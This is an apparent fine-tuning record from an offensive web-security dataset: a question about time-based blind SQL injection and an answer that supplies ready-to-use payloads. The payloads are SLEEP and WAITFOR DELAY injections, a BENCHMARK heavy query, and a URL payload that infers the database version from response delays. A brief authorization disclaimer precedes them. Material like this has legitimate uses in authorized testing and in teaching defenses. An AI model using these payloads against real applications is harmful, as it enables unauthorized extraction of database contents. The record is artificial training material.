# SQLI — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: sqli
- cwe: CWE-89

## Scenario

What payloads and steps should I use for Time Based Injection when working on SQL Injection?

## Analysis / Response

**Time Based Injection** — this technique applies to SQL Injection. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

Time-based SQL Injection is a type of blind SQL Injection attack that relies on database delays to infer whether certain queries return true or false. It is used when an application does not display any direct feedback from the database queries but allows execution of time-delayed SQL commands. The attacker can analyze the time it takes for the database to respond to indirectly gather information from the database.

* Default `SLEEP` function for the database

```sql
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --
```

* Heavy queries that take a lot of time to complete, usually crypto functions.

```sql
BENCHMARK(2000000,MD5(NOW()))
```

Let's see a basic example to recover the version of the database using a time based sql injection.

```sql
http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
```

If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.
